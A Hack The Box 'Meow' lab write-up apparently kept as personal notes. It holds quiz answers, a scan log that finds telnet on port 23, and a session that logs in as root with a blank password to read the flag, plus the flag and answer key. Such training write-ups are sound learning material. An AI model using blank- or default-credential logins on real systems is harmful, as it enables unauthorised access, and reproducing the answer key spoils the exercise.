Download vpn from lab

What does the acronym VM stand for? 
*Virtual Machine *

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell. 
*terminal*

What service do we use to form our VPN connection into HTB labs? 
*openvpn*

Let the configuration script run until you see the Initialization Sequence Completed message at the
very end of the output. Once that is present, make sure that there is no mention of multiple tunnel
interfaces, such as tun1 , tun2 , and so forth. Having multiple tunnel interfaces can ruin the stability of your
connection to the target and create routing conflicts on your Operating System, which would only bring
frustration. There should only be tun0 

https://app.hackthebox.com/e680eab9-86c5-4ae6-b7e4-5d3a0ae8b785

What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output? 
*tun*

What tool do we use to test our connection to the target with an ICMP echo request? 
It's also half of the name of a very popular sport, also known as table tennis.
*ping*

What is the name of the most common tool for finding open ports on a target? 
*nmap*

What service do we identify on port 23/tcp during our scans? 
This service runs on port 23/tcp by default, meaning we can research the port on Google and receive the correct result easily.
*telnet*

```
┌──(kali㉿kali)-[~]
└─$ ping 10.129.207.239
PING 10.129.207.239 (10.129.207.239) 56(84) bytes of data.
64 bytes from 10.129.207.239: icmp_seq=1 ttl=63 time=202 ms
64 bytes from 10.129.207.239: icmp_seq=2 ttl=63 time=191 ms
^C
--- 10.129.207.239 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2007ms
rtt min/avg/max/mdev = 190.969/196.616/202.264/5.647 ms
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.207.239 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.207.239:23
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 00:00 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
Initiating Ping Scan at 00:00
Scanning 10.129.207.239 [2 ports]
Completed Ping Scan at 00:00, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:00
Completed Parallel DNS resolution of 1 host. at 00:00, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:00
Scanning 10.129.207.239 [1 port]
Discovered open port 23/tcp on 10.129.207.239
Completed Connect Scan at 00:00, 0.19s elapsed (1 total ports)
Initiating Service scan at 00:00
Scanning 1 service on 10.129.207.239
Completed Service scan at 00:00, 10.37s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.207.239.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 10.43s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
Nmap scan report for 10.129.207.239
Host is up, received conn-refused (0.19s latency).
Scanned at 2022-11-01 00:00:37 EDT for 22s

PORT   STATE SERVICE REASON  VERSION
23/tcp open  telnet  syn-ack Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.18 seconds

after trying some typical admin accounts (admin, administrator, root)

┌──(kali㉿kali)-[~]
└─$ telnet 10.129.207.239                        
Trying 10.129.207.239...
Connected to 10.129.207.239.
Escape character is '^]'.


  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
Password: 


Login incorrect
Meow login: administrator
Password: 


Login incorrect
Meow login: admin
Password: 
Login timed out after 60 seconds.
Connection closed by foreign host.
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ telnet 10.129.207.239
Trying 10.129.207.239...
Connected to 10.129.207.239.
Escape character is '^]'.


  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
Password: 


Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 01 Nov 2022 04:03:10 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             138
  Users logged in:       0
  IPv4 address for eth0: 10.129.207.239
  IPv6 address for eth0: dead:beef::250:56ff:fe96:3e07

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19

pwnd
```

What username is able to log into the target over telnet with a blank password? 
*root*

Submit root flag 
*b40abdfe23665f766f9c61ecba8a4c19*


[[Follina MSDT]]